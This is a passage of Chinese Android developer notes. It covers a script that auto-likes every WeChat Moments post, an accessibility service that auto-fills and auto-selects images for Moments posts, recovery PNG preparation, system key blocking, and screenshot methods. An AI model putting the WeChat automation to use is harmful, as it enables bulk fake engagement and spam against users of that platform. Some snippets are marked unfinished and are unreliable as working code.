from poco.drivers.android.uiautomation import AndroidUiautomationPoco

poco = AndroidUiautomationPoco(use_airtest_input=True, screenshot_each_action=False)
connect_device("Android://127.0.0.1:5037/f350e2f7")
print("start...")
PKG = "com.tencent.mm"  # 微信包名
stop_app(PKG)  # 关闭此app
wake()  # 唤醒并解锁设备
home()  # 返回HOME界面
start_app(PKG)  # 启动此app

poco(text='发现').wait(2).click()
pyq = poco(text='朋友圈')
pyq.click()

while True:
    try:
        # 评论按钮
        comments = poco("com.tencent.mm:id/eho")
        for comment in comments:
            childX, childY = comment.get_position()
            print(childX)
            print(childY)
            if (childY >= 0.1 and childY < 1.0):
                comment.click()
                zan = poco(text='赞')
                if zan.exists():
                    zan.click()
    except Exception as e:
        print('error'+str(e))
        keyevent("BACK")  # 有可能进入其它页面，调用系统级返回按钮
        if pyq.exists(): # 如果返回到发现页，重新进入朋友圈
            pyq.click()
    swipe((500, 1700), (500, 900))  # 向上滑动
```

## 利用Accessibility分享朋友圈

```text
public class AutoCopyService extends AccessibilityService {
    private String TARGET_UI = "";
    private String EDIT_TEXT_ID = "";
    @Override
    public void onAccessibilityEvent(final AccessibilityEvent event) {
        int eventType = event.getEventType();
        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            //
            getWeChatSupport();
            if (TARGET_UI.equals(event.getClassName())) {
                //如果当前页面是目标页面
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR2) {
                    final AccessibilityNodeInfo nodeInfo = getRootInActiveWindow();
                    if (nodeInfo == null) {
                        System.out.println(" onAccessibilityEvent error  null");
                        return;
                    }
                    if (TextUtils.isEmpty(EDIT_TEXT_ID)) {
                        Toast.makeText(this, "自动复制失败，并重试！", Toast.LENGTH_SHORT).show();
                        return;
                    }
                    List<AccessibilityNodeInfo> openId = nodeInfo.findAccessibilityNodeInfosByViewId(EDIT_TEXT_ID);
                    if (openId != null && openId.size() > 0) {
                        String timeLineContent = Preference.create(this).getPrefString("TIME_LINE_CONTENT", "");
                        if (!TextUtils.isEmpty(timeLineContent)) {
                            Bundle arguments = new Bundle();
                            arguments.putCharSequence(AccessibilityNodeInfo
                                    .ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, timeLineContent);
                            openId.get(0).performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                        }
                        Preference.create(this).setPrefString("TIME_LINE_CONTENT", "");
                    }
 
 
                    //-------------------------673版本處理方案----------------------------------------------
                    /**
                     * 添加按钮的GridView的Item的LinearLayout
                     * 667 com.tencent.mm:id/jz
                     * 673 com.tencent.mm:id/lr
                     */
                    int image_num = Preference.create(getApplicationContext()).getPrefInt("image_num", 0);
                    if (image_num <= 0)
                        return;
                    List<AccessibilityNodeInfo> imageAdd = nodeInfo.findAccessibilityNodeInfosByText("添加照片按钮");
                    if (null == imageAdd || imageAdd.isEmpty())
                        return;
 
                    List<AccessibilityNodeInfo> alreadyAdd = nodeInfo.findAccessibilityNodeInfosByText("图片");//已经添加的图片
                    //如果已经添加的图片数量 等于  模板图片的数量，则不用点击
                    if (null != alreadyAdd && alreadyAdd.size() == (image_num + 1)) {
                        return;
                    }
                    AccessibilityNodeInfo lin_image_add = imageAdd.get(0).getParent();
                    if (null == lin_image_add) {
                        return;
                    }
                    //点击相机小图片
                    lin_image_add.performAction(AccessibilityNodeInfo.ACTION_CLICK);
 
                    sleep(600);
 
                    //点击从相册选择
                    clickToChooseImage();
 
                }
            }
            //自动选择图片
            if ("com.tencent.mm.plugin.gallery.ui.AlbumPreviewUI".equals(event.getClassName())) {
                int image_num = Preference.create(getApplicationContext()).getPrefInt("image_num", 0);
                if (image_num <= 0) {
                    return;
                }
                sleep(500);
                AccessibilityNodeInfo nodeInfo = getRootInActiveWindow();
 
                checkImage(nodeInfo);
 
            }
        }
    }
 
 
    //选择图片
    private void checkImage(AccessibilityNodeInfo nodeInfo) {
        //com.tencent.mm:id/bt3
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR2) {
            /**
             * 图片列表的CheckBoc上层的ImageVIew 代替点击的
             * 667 com.tencent.mm:id/bt4
             * 673 com.tencent.mm:id/bhl
             */
            int image_num = Preference.create(getApplicationContext()).getPrefInt("image_num", 0);
            int compat_num = Preference.create(getApplicationContext()).getPrefInt("compat_num", 0);
            if (null == nodeInfo) {
                if (compat_num > 0) {
                    sleep(1000);
                    performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                    sleep(600);
                    performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                    Preference.create(getApplicationContext()).setPrefInt("compat_num", 0);
                } else {
                    Preference.create(getApplicationContext()).setPrefInt("image_num", 0);
                    Toast.makeText(this, "当前手机不支持自动选择，请从第" + image_num + "个倒序手动选择图片", Toast.LENGTH_SHORT).show();
                }
                return;
            }
 
            List<AccessibilityNodeInfo> checkList = nodeInfo.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/bhl");
            if (null == checkList || checkList.isEmpty()) {
                Preference.create(getApplicationContext()).setPrefInt("image_num", 0);
                Toast.makeText(this, "本次操作不支持自动选择，请从第" + image_num + "个倒序手动选择图片", Toast.LENGTH_SHORT).show();
                return;
            }
            if (image_num < checkList.size()) {
                for (int i = image_num - 1; i >= 0; i--) {
                    logger("addimage_click", String.format("点击第%d张", i));
                    checkList.get(i).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
 
                clickSubmitImage(nodeInfo);
            }
        }
    }
 
 
    private void clickSubmitImage(AccessibilityNodeInfo nodeInfo) {
//        com.tencent.mm:id/hg
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR2) {
            /**
             * 完成 的 TextView
             * 667 com.tencent.mm:id/hg
             * 673 com.tencent.mm:id/j0
             */
            Preference.create(getApplicationContext()).setPrefInt("image_num", 0);
            List<AccessibilityNodeInfo> submit = nodeInfo.findAccessibilityNodeInfosByText("完成");
//            List<AccessibilityNodeInfo> submit = nodeInfo.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/j0");
            if (null == submit || submit.isEmpty()) return;
            submit.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
 
        }
    }
 
    private void clickToChooseImage() {
        //
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR2) {
            final AccessibilityNodeInfo nodeInfo = getRootInActiveWindow();
            if (null != nodeInfo) {
                /**
                 * 点击添加图片的弹出框的ListView
                 * 667 com.tencent.mm:id/i7
                 * 673 com.tencent.mm:id/jq
                 */
                List<AccessibilityNodeInfo> textView = nodeInfo.findAccessibilityNodeInfosByText("从相册选择");
                if (textView.isEmpty()) return;
                try {
                    AccessibilityNodeInfo lin_item = textView.get(0).getParent().getParent();
                    if (TextUtils.equals(lin_item.getClassName(), "android.widget.LinearLayout"))
                        lin_item.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    logger("addimage_click", "跳转到选择图片列表");
                } catch (Exception e) {
                    logger("addimage_click", e.getMessage());
                }
 
 
            }
        }
    }
 
    private void sleep(long millis) {
        try {
            Thread.sleep(millis);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
 
    @Override
    public void onInterrupt() {
        logger("addimage_click", "onInterrupt 服务中断了");
 
    }
 
    @Override
    protected void onServiceConnected() {
        logger("addimage_click", "onServiceConnected success");
        getWeChatSupport();
        super.onServiceConnected();
    }

    /**
     * 加载微信的相关信息
     */
    private void getWeChatSupport() {
        String install_wechat_version_name = Preference.create(this).getPrefString("install_wechat_version_name", "");
        if (TextUtils.isEmpty(install_wechat_version_name))
            return;
        try {
            WechatSuppertEntity support = App.getDB().findById(WechatSuppertEntity.class, install_wechat_version_name);
            TARGET_UI = support.getTarget_ui();
            EDIT_TEXT_ID = support.getWechat_weiget_id();
        } catch (Exception e) {
            e.printStackTrace();
            TARGET_UI = "";
            EDIT_TEXT_ID = "";
        }
    }
 
    private void logger(String tag, String message) {
        boolean isDebug = x.isDebug();
        if (isDebug) {
            LoggerPrinter.saveLogger("自动辅助服务：tag:" + tag + "--->message:" + message);
        }
    }
}
```

## [图片]  [开机动画]  [recovery] Android recovery图片资源制作

```text
一、文字图片转换
png 图片生成源码
development/tools/recovery_l10n/
bootable/recovery/tools/recovery_l10n
原生的源代码有个bug，导致读取出来的Locale[] 数组值全部为空，无法完成图片的制作。

diff --git a/tools/recovery_l10n/src/com/android/recovery_l10n/Main.java b/tools/recovery_l10n/src/com/android/recovery_l10n/Main.java
index 3f2bebe..5da5592 100755
--- a/tools/recovery_l10n/src/com/android/recovery_l10n/Main.java
+++ b/tools/recovery_l10n/src/com/android/recovery_l10n/Main.java
@@ -150,7 +150,7 @@ public class Main extends Activity {
         Arrays.sort(localeNames);
         ArrayList<Locale> locales = new ArrayList<Locale>();
         for (String ln : localeNames) {
-            int u = ln.indexOf('_');
+            int u = ln.indexOf('-');
             if (u >= 0) {
                 Log.i(TAG, "locale = " + ln);
                 locales.add(new Locale(ln.substring(0, u), ln.substring(u+1)));
1、res\values-zh-rCN\strings.xml用于显示中文文字，可以修改里面的中文文字为您所需要的。
2、res\layout\main.xml用于改变文字格式，如大小、字体等。
3、然后使用mm编译出out\target\product…\system\app\RecoveryLocalizer.apk。
4、安装打开后选择需要的文字图片后点击go按钮。
5、取出图片：adb pull data/data/com.android.recovery_l10n/files/text-out.png
6、生成的图片还不能直接替换系统图片，需要在Ubuntu环境下作进一步处理
（如未安装 pngcrush，请先安装 ：sudo apt-get install pngcrush）
pngcrush -c 0 text-out.png output.png

二、android5.1 logo动画
android5.1的logo动画是单张多帧PNG图片
1、安装python、pip、PIL 图形库
2、python interlace-frames.py .\src1.png .\src2.png .\src3.png .\src4.png .\src5.png .\src6.png .\src7.png .\src8.png .\dst.png

三、android8.1 logo动画
android8.1的logo动画是多张8位深度png的图片
用 imagemagick 工具的 convert 命令转换     sudo apt-get install imagemagick
//convert src.png -colorspace gray dst.png
convert image.png -define png:color-type=2 result.png

bit_depth（8）channels（3）color_type（2）



// 批量转换图片的脚本
#!/bin/bash
# get all filename in specified path

path=$1
files=$(ls $path)
for filename in `find . -name "*.png"`;
do
    echo "convert"$filename
    convert $filename -define png:color-type=2 $filename
done



查看png图片信息
sudo apt-get install pngtools
pnginfo bootable/recovery/res-mdpi/images/error_text.png

显示结果如下:
error_text.png...
  Image Width: 163 Image Length: 2582
  Bitdepth (Bits/Sample): 8
  Channels (Samples/Pixel): 1
  Pixel depth (Pixel Depth): 8
  Colour Type (Photometric Interpretation): GRAYSCALE 
  Image filter: Single row per byte filter 
  Interlacing: No interlacing 
  Compression Scheme: Deflate method 8, 32k window
  Resolution: 0, 0 (unit unknown)
  FillOrder: msb-to-lsb
  Byte Order: Network (Big Endian)
  Number of text strings: 0

使用 convert 命令转换之后查看图片信息显示结果如下：
error_text.png...
  Image Width: 163 Image Length: 2582
  Bitdepth (Bits/Sample): 8
  Channels (Samples/Pixel): 3
  Pixel depth (Pixel Depth): 24
  Colour Type (Photometric Interpretation): RGB 
  Image filter: Single row per byte filter 
  Interlacing: No interlacing 
  Compression Scheme: Deflate method 8, 32k window
  Resolution: 0, 0 (unit unknown)
  FillOrder: msb-to-lsb
  Byte Order: Network (Big Endian)
  Number of text strings: 0


转换之后的 channels 和 pixel depth 和 Colour Type 都已经发生了变化
```

## [图片] PNG图片文件的种类

```text
https://blog.csdn.net/csdn66_2016/article/details/72303400

6.2 PNG支持的种类

    并非所有的PNG图片，在recovery下面都可以显示，这也是很多人会遇到的问题，明明是png图片，怎么还是不能显示呢，recovery原生对png图片的支持如下：

      bit_depth         channels        color_type

         8                 3                2

        <=8                1                0

        <=8                1                3

    其中bit_depth是位深度, channels是指支持的颜色的种类，color_type是值颜色类型。我们需要记住的是：

    bit_depth不能大于8。

    color_type值有 PNG_COLOR_TYPE_GRAY（0）

                   PNG_COLOR_TYPE_RGB（2）

                   PNG_COLOR_TYPE_PALETTE（3）

channels值，与color_type有关，PNG_COLOR_TYPE_GRAY 与 PNG_COLOR_TYPE_PALETTE 时，只有一种颜色，PNG_COLOR_TYPE_RGB 时有三种颜色

6.3 判断PNG属性方法

我们上节描述了，通过三个属性，来看一个png图片是否能在recovery中显示，当我们拿到一个png图片的时候，怎么分析呢，我们可以写个小的获取png info的程序。

第一步：编译 libpng.a 库文件

我们从官网下载png的源码，http://www.libpng.org/pub/png/libpng.html，注意 linux/ubuntu 系统下需要下载 libpng-1.6.37.tar.gz 的压缩包(否则编译的时候会出现 /bin/sh^M:bad interpreter: No such file or directory 的错误)，然后解压，然后编译：./configure CC=gcc --prefix=$PWD/_install, make, make install; 然后就可以生成 libpng.a 以及 png.h 相关文件了。

第二步：写 sample

pnginfo.c

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "png.h"
 
int main(int argc ,char **argv) {
    unsigned char header[8] ;
    size_t bytesRead;
    int result = 0;
    FILE* fp = NULL;
    png_structp png_ptr = NULL;
    png_infop info_ptr = NULL;
    int color_type, bit_depth;
    png_uint_32 width;
    png_uint_32 height;
    png_byte channels;
 
    if (argc !=2 ) {
        printf("eg:./pnginfo png_name\n");
        return -1;
    }
 
    fp = fopen(argv[1] , "rb");
    if (fp == NULL) {
        result = -1;
        goto exit;
    }
 
    bytesRead = fread(header, 1, sizeof(header), fp);
    if (bytesRead != sizeof(header)) {
        result = -2;
        goto exit;
    }
 
    if (png_sig_cmp(header, 0, sizeof(header))) {
        result = -3;
        goto exit;
    }
 
    png_ptr = png_create_read_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    if (!png_ptr) {
        result = -4;
        goto exit;
    }
 
    info_ptr = png_create_info_struct(png_ptr);
    if (!info_ptr) {
        result = -5;
        goto exit;
    }
 
    if (setjmp(png_jmpbuf(png_ptr))) {
        result = -6;
        goto exit;
    }
 
    png_init_io(png_ptr, fp);
    png_set_sig_bytes(png_ptr, sizeof(header));
    png_read_info(png_ptr, info_ptr);
 
    png_get_IHDR(png_ptr, info_ptr, &width, &height, &bit_depth,
            &color_type, NULL, NULL, NULL);
 
    channels = png_get_channels(png_ptr, info_ptr);
 
    printf("pnginfo bit_depth:%d, channels:%d, color_type:%d\n", bit_depth, channels, color_type);
 
exit:
    if (fp != NULL) {
        fclose(fp);
        fp = NULL;
    }
 
    printf("pnginfo result:%d\n", result);
    return result;
}




makefile:
CC=gcc
TARGET=pnginfo
 
%.o:%.c
 $(CC) -c $(CFLAGS) $(CPPFLAGS) -o $@ $<
 
all:pnginfo.o
 $(CC) -o $(TARGET) $< -L. -lpng -lz -lm
 
clean:
 rm -rf *.o $(TARGET)

执行make即可生成pnginfo
TODO : 这一步 make 的时候失败了，不知道如何解决????

第三步：获取png属性
./pnginfo icon_error.png

6.4 png转换
使用如下命令转换 convert image.png -define png:color-type=2 result.png
如果我拿到的png图片，不支持怎么办呢，我们可以使用PS工具，把png图片转换为recovery可支持的格式即可，如果又不太会使用PS工具呢，还有个更简单的方法，采用QQ的截图功能，然后另存为png图片即可，QQ截图保存的png是标准的RGB格式，即 bit_depth（8）channels（3）color_type（2）
    
6.5 总结
通过上述了解，现在知道了recovery的图片资源文件png的信息了，怎么去判断png是否能够在recovery中显示，以及如果制作recovery支持的png背景图片了。
```

## dos 系统文件转换成 unix 系统文件

```text
如何确认是 dos 系统文件
用 vi 打开文件可以看到文件每一行的末尾都有 ^M 的字符
方法1：用 dos2unix 命令可以转换

方法2：在 windows 上用 EditPlus 打开文件，双击右下角状态栏文件格式相关的那一栏，会弹出一个对话框让你选择转换成什么系统的文件格式 PC / UNIX/Mac / MacOS9
```

## Android 屏蔽Power键 Home键 在InputDispatcher.cpp中处理

```text
frameworks/base/native/services/inputflinger/InputDispatcher.cpp

void InputDispatcher::notifyKey(const NotifyKeyArgs* args) {
#if DEBUG_INBOUND_EVENT_DETAILS
    ALOGD("notifyKey - eventTime=%lld, deviceId=%d, source=0x%x, policyFlags=0x%x, 
    action=0x%x, flags=0x%x, keyCode=0x%x, scanCode=0x%x,
    metaState=0x%x, downTime=%lld",
            args->eventTime, args->deviceId, args->source, args->policyFlags,
            args->action, args->flags, args->keyCode, args->scanCode,
            args->metaState, args->downTime);
#endif
    if (!validateKeyEvent(args->action)) {
        return;
    }

    uint32_t policyFlags = args->policyFlags;
    int32_t flags = args->flags;
    int32_t metaState = args->metaState;
    if ((policyFlags & POLICY_FLAG_VIRTUAL) || (flags &
            AKEY_EVENT_FLAG_VIRTUAL_HARD_KEY)) {
        policyFlags |= POLICY_FLAG_VIRTUAL;
        flags |= AKEY_EVENT_FLAG_VIRTUAL_HARD_KEY;
    }
    if (policyFlags & POLICY_FLAG_FUNCTION) {
        metaState |= AMETA_FUNCTION_ON;
    }

    policyFlags |= POLICY_FLAG_TRUSTED;

    int32_t keyCode = args->keyCode;
    if (metaState & AMETA_META_ON && args->action == AKEY_EVENT_ACTION_DOWN) {
        int32_t newKeyCode = AKEYCODE_UNKNOWN;
        if (keyCode == AKEYCODE_DEL) {
            newKeyCode = AKEYCODE_BACK;
        } else if (keyCode == AKEYCODE_ENTER) {
            newKeyCode = AKEYCODE_HOME;
        }
        if (newKeyCode != AKEYCODE_UNKNOWN) {
            AutoMutex _l(mLock);
            struct KeyReplacement replacement = {keyCode, args->deviceId};
            mReplacedKeys.add(replacement, newKeyCode);
            keyCode = newKeyCode;
            metaState &= ~AMETA_META_ON;
        }
    } else if (args->action == AKEY_EVENT_ACTION_UP) {
        // In order to maintain a consistent stream of up and down events, check to see if the key
        // going up is one we've replaced in a down event and haven't yet replaced in an up event,
        // even if the modifier was released between the down and the up events.
        AutoMutex _l(mLock);
        struct KeyReplacement replacement = {keyCode, args->deviceId};
        ssize_t index = mReplacedKeys.indexOfKey(replacement);
        if (index >= 0) {
            keyCode = mReplacedKeys.valueAt(index);
            mReplacedKeys.removeItemsAt(index);
            metaState &= ~AMETA_META_ON;
        }
    }

    KeyEvent event;
    event.initialize(args->deviceId, args->source, args->action,
            flags, keyCode, args->scanCode, metaState, 0,
            args->downTime, args->eventTime);

    mPolicy->interceptKeyBeforeQueueing(&event, /*byref*/ policyFlags);

    bool needWake;
    { // acquire lock
        mLock.lock();

        if (shouldSendKeyToInputFilterLocked(args)) {
            mLock.unlock();

            policyFlags |= POLICY_FLAG_FILTERED;
            if (!mPolicy->filterInputEvent(&event, policyFlags)) {
                return; // event was consumed by the filter
            }

            mLock.lock();
        }

        int32_t repeatCount = 0;
        //add your control code here
        if(false){
            //origin source code
        }else{
            //your self source code
        }
        #ifdef CONTROL_KEY_CODE
            //your self source code
        #else
            //origin source doce
        #endif
        KeyEntry* newEntry = new KeyEntry(args->eventTime,
                args->deviceId, args->source, policyFlags,
                args->action, flags, keyCode, args->scanCode,
                metaState, repeatCount, args->downTime);

        needWake = enqueueInboundEventLocked(newEntry);
        mLock.unlock();
    } // release lock

    if (needWake) {
        mLooper->wake();
    }
}
```

## Android捕获监听Home键、最近任务列表键

```text
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.widget.Toast;
 
public class MainActivity extends Activity {
 private MyReceiver receiver;
 @Override
 protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  // setContentView(R.layout.activity_main);
  receiver = new MyReceiver();
  IntentFilter homeFilter = new IntentFilter(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
  registerReceiver(receiver, homeFilter);
 }

 @Override
 public void onDestroy() {
  unregisterReceiver(receiver);
  super.onDestroy();
 }

 private class MyReceiver extends BroadcastReceiver {
  private final String SYSTEM_DIALOG_REASON_KEY = "reason";
  private final String SYSTEM_DIALOG_REASON_HOME_KEY = "homekey";
  private final String SYSTEM_DIALOG_REASON_RECENT_APPS = "recentapps";
 
  @Override
  public void onReceive(Context context, Intent intent) {
   String action = intent.getAction();
   if (action.equals(Intent.ACTION_CLOSE_SYSTEM_DIALOGS)) {
    String reason = intent.getStringExtra(SYSTEM_DIALOG_REASON_KEY);
 
    if (reason == null) {
     return;
    }
 
    // Home键
    if (reason.equals(SYSTEM_DIALOG_REASON_HOME_KEY)) {
     Toast.makeText(getApplicationContext(), "按了Home键", Toast.LENGTH_SHORT).show();
    }
 
    // 最近任务列表键
    if (reason.equals(SYSTEM_DIALOG_REASON_RECENT_APPS)) {
     Toast.makeText(getApplicationContext(), "按了最近任务列表", Toast.LENGTH_SHORT).show();
    }
   }
  }
 }
}
```

## activity 标签中 android:logo 和 android:icon 的区别

```text
其中android:icon就是你的安卓应用图标，比如在桌面上显示的应用图标。
而logo是什么时候被使用呢?ActionBar上有一个图标，那个图标就是使用的android:logo对应的那个资源，一般是一个drawble的资源。
```

## android 获取 versionName 和 versionCode 以及作用

```text
android:versionCode: 
主要是用于版本升级所用，是INT类型的，第一个版本定义为1，以后递增，这样只要判断该值就能确定是否需要升级，该值不显示给用户。 
android:versionName: 
这个是我们常说明的版本号，由三部分组成..,该值是个字符串，可以显示给用户。 
关于版本号有两个值，如下面的例子

android:versionCode="2"
android:versionName="1.1"

versionCode是给设备程序识别版本(升级)用的，必须是一个interger值，整数，代表app更新过多少次

versionName是给用户看的，可以写1.1.1 , 1.1.2的形式

延伸出另外一个问题：当app需要校对版本的时候怎样读取这个值?

//eclipse获取versionCode和versionName 这两个参数是写在manifest.xml文件中
public void getEclipseVersionInfo(){
    int versioncode;
    String versionname;
    PackageManager pm = getPackageManager();
    try {
        PackageInfo packageInfo = pm.getPackageInfo(getPackageName(), 0);
        versioncode = packageInfo.versionCode;
        versionname = packageInfo.versionName;
    } catch (PackageManager.NameNotFoundException e) {
        e.printStackTrace();
    }
}
//在Android Studio中获取到versionname和versionCode 这两个参数是写在${modle_name}.gradle文件中

public void getASVersionName() {
    int versionCode = BuildConfig.VERSION_CODE;
    String versionName = BuildConfig.VERSION_NAME;
}
这样我们就可以拿到versioncode和versionname了，这里我们看到使用到了BuildConfig类（是从项目包下的配置文件，即 我们的包名.BuildConfig;），可以导入这个类后Ctrl+单击查看这个类,里面还有其他的参数

手机型号: android.os.Build.MODEL 
SDK版本: android.os.Build.VERSION.SDK
系统版本: android.os.Build.VERSION.RELEASE
```

## Android 实现连点两次返回后退出整个App

```text
主要是监听onBackPressed来实现在两秒之内连点两次实现退出App，一般使用在首页。以下是源代码和实现的效果：
@Override
public boolean onKeyDown(int keyCode, KeyEvent event) {
    if (keyCode == KeyEvent.KEYCODE_BACK) {
        if ((System.currentTimeMillis() - mExitTime) > 2000) {
            Toast.makeText(this, "再按一次退出程序", Toast.LENGTH_SHORT).show();
            mExitTime = System.currentTimeMillis();
        } else {
            finish();
        }
        return true;
    }
    return super.onKeyDown(keyCode, event);
}
```

## [截屏] 截屏的几种方法

```text
// 第一种：5.0 之后开放了截屏的方法
if (Build.VERSION.SDK_INT >= 21) {
    startActivityForResult(((MediaProjectionManager) getSystemService("media_projection")).createScreenCaptureIntent(),1);
} else {
    Log.e("TAG", "版本过低,无法截屏");
}

@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    switch (requestCode) {
        case REQUEST_MEDIA_PROJECTION: {
            if (resultCode == -1 && data != null) {
                parseData(data);
            }
        }
    }
}

private void parseData(Intent data){
 MediaProjection mMediaProjection = (MediaProjectionManager).getSystemService(
            Context.MEDIA_PROJECTION_SERVICE).getMediaProjection(Activity.RESULT_OK,data);
        ImageReader mImageReader = ImageReader.newInstance(
                getScreenWidth(),
                getScreenHeight(),
                PixelFormat.RGBA_8888,1);

 VirtualDisplay mVirtualDisplay = mMediaProjection.createVirtualDisplay("screen-mirror",
            getScreenWidth(),
            getScreenHeight(),
            Resources.getSystem().getDisplayMetrics().densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            mImageReader.getSurface(), null, null);

 Handler handler = new Handler();
    handler.postDelayed(new Runnable() {
       @Override
       public void run() {
           Image image = mImageReader.acquireLatestImage();
           // TODO 将image保存到本地即可
       }
    }, 300);

 mVirtualDisplay.release();
 mVirtualDisplay = null;
}

// 第二种：使用 decorView
public static Bitmap capture(Activity activity) {
    activity.getWindow().getDecorView().setDrawingCacheEnabled(true);
    Bitmap bmp = activity.getWindow().getDecorView().getDrawingCache();
    return bmp;
}

public static Bitmap shotActivity(Activity ctx) {
    View view = ctx.getWindow().getDecorView();
    view.setDrawingCacheEnabled(true);
    view.buildDrawingCache();
    Bitmap bp = Bitmap.createBitmap(view.getDrawingCache(), 0, 0, view.getMeasuredWidth(),
    view.getMeasuredHeight());
    view.setDrawingCacheEnabled(false);
    view.destroyDrawingCache();
    return bp;
}

// 第三种 ： 使用 screencap 命令
adb shell screencap -p /sdcard/sreenshot1.png

// 长截屏
// scrollView 截屏
public static Bitmap shotScrollView(ScrollView scrollView) {
    int h = 0;
    Bitmap bitmap = null;
    for (int i = 0; i < scrollView.getChildCount(); i++) {
        h += scrollView.getChildAt(i).getHeight();
        scrollView.getChildAt(i).setBackgroundColor(Color.parseColor("#ffffff"));
    }
    bitmap = Bitmap.createBitmap(scrollView.getWidth(), h, Bitmap.Config.RGB_565);
    final Canvas canvas = new Canvas(bitmap);
    scrollView.draw(canvas);
    return bitmap;
}

// listView 截屏
public static Bitmap shotListView(ListView listview) {
    ListAdapter adapter = listview.getAdapter();
    int itemscount = adapter.getCount();
    int allitemsheight = 0;
    List<Bitmap> bmps = new ArrayList<Bitmap>();
    for (int i = 0; i < itemscount; i++) {
        View childView = adapter.getView(i, null, listview);
        childView.measure(
        View.MeasureSpec.makeMeasureSpec(listview.getWidth(), View.MeasureSpec.EXACTLY),
        View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED));
        childView.layout(0, 0, childView.getMeasuredWidth(), childView.getMeasuredHeight());
        childView.setDrawingCacheEnabled(true);
        childView.buildDrawingCache();
        bmps.add(childView.getDrawingCache());
        allitemsheight += childView.getMeasuredHeight();
    }

    Bitmap bigbitmap = Bitmap.createBitmap(listview.getMeasuredWidth(), allitemsheight, Bitmap.Config.ARGB_8888);
    Canvas bigcanvas = new Canvas(bigbitmap);
    Paint paint = new Paint();
    int iHeight = 0;

    for (int i = 0; i < bmps.size(); i++) {
        Bitmap bmp = bmps.get(i);
        bigcanvas.drawBitmap(bmp, 0, iHeight, paint);
        iHeight += bmp.getHeight();
        bmp.recycle();
        bmp = null;
    }
    return bigbitmap;
}

// recyclerView 截屏
public static Bitmap shotRecyclerView(RecyclerView view) {
    RecyclerView.Adapter adapter = view.getAdapter();
    Bitmap bigBitmap = null;
    if (adapter != null) {
      int size = adapter.getItemCount();
      int height = 0;
      Paint paint = new Paint();
      int iHeight = 0;
      final int maxMemory = (int) (Runtime.getRuntime().maxMemory() / 1024);

      // Use 1/8th of the available memory for this memory cache.
      final int cacheSize = maxMemory / 8;
      LruCache<String, Bitmap> bitmaCache = new LruCache<>(cacheSize);
      for (int i = 0; i < size; i++) {
        RecyclerView.ViewHolder holder = adapter.createViewHolder(view, adapter.getItemViewType(i));
        adapter.onBindViewHolder(holder, i);
        holder.itemView.measure(
            View.MeasureSpec.makeMeasureSpec(view.getWidth(), View.MeasureSpec.EXACTLY),
            View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED));
        holder.itemView.layout(0, 0, holder.itemView.getMeasuredWidth(),
            holder.itemView.getMeasuredHeight());
        holder.itemView.setDrawingCacheEnabled(true);
        holder.itemView.buildDrawingCache();
        Bitmap drawingCache = holder.itemView.getDrawingCache();
        if (drawingCache != null) {

          bitmaCache.put(String.valueOf(i), drawingCache);
        }
        height += holder.itemView.getMeasuredHeight();
      }

      bigBitmap = Bitmap.createBitmap(view.getMeasuredWidth(), height, Bitmap.Config.ARGB_8888);
      Canvas bigCanvas = new Canvas(bigBitmap);
      Drawable lBackground = view.getBackground();
      if (lBackground instanceof ColorDrawable) {
        ColorDrawable lColorDrawable = (ColorDrawable) lBackground;
        int lColor = lColorDrawable.getColor();
        bigCanvas.drawColor(lColor);
      }

      for (int i = 0; i < size; i++) {
        Bitmap bitmap = bitmaCache.get(String.valueOf(i));
        bigCanvas.drawBitmap(bitmap, 0f, iHeight, paint);
        iHeight += bitmap.getHeight();
        bitmap.recycle();
      }
    }
    return bigBitmap;
}

// 第四种：完美截屏(优雅的方案实现屏幕截图，利用android 5.0之后的录屏API实现截屏)
https://github.com/BruceWind/AndroidScreenShot_SysApi

// 第五种：通过 /dev/graphics/fb0 获取屏幕截屏
FileInputStream graphics = null;
try {
    graphics = new FileInputStream(“/dev/graphics/fb0”);
} catch (FileNotFoundException e) {
    e.printStackTrace();
    return null;
}

DataInputStream dStream = new DataInputStream(graphics);
dStream.readFully(piex);
dStream.close();

int[]  colors = new int[screenHeight * screenWidth] ;
// 将rgb转为色值
for (int m = 0; m < colors.length; m++) {
    int r = (piex[m * 4]  & 0xFF);
    int g = (piex[m * 4 + 1]  & 0xFF);
    int b = (piex[m * 4 + 2]  & 0xFF);
    int a = (piex[m * 4 + 3]  & 0xFF);
    colors[m]  = (a << 24) + (r << 16) + (g << 8) + b;
}
Bitmap bitmap = Bitmap.createBitmap(colors, screenWidth, screenHeight, Bitmap.Config.ARGB_8888);

// 第六种：通过 screencap 命令截屏

// 第七种：通过修改 screencap 源码加入jni之后后台截屏
https://blog.csdn.net/lingfengxu/article/details/43487793
https://blog.csdn.net/Ctrl_qun/article/details/52604859

// 第七种：通过 ddms 工具截屏

// kaios截屏，对于kaios的截图，可通过frefox浏览器(版本不高于firefox-59.0)实现
